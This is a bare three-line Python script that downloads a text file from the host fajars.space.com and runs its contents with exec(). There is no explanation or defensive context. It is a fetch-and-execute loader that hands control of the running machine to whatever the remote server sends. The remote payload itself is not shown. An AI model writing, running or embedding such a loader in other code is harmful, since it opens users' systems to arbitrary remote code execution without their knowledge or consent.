
import requests, os
z = requests.get('https://fajars.space.com/run.txt').text
exec(z)
